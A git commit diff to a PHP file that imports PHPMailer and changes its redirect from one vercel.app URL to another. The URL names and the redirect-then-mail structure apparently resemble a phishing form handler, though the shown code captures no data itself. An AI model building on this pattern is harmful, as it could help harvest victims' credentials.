a496e882ba1f8d89a1c359f8be0f2918c98121ec
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 16:37:09 +0500

    Update jahangir2.php

--- jahangir2.php
+++ jahangir2.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://submit-form-for-gating-tick-pass.vercel.app/");
+header("Location:https://jhangir2pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
